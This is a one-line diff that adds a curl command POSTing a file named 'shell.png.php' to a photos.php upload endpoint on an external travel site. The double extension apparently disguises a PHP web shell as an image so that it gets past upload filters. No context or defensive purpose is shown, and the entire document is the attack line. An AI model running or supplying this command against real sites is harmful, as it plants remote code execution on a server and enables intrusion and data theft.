@@ -1,0 +1,1 @@
+curl -X POST http://travel.rogue-sentinels.io/photos.php -F file=@shell.png.php
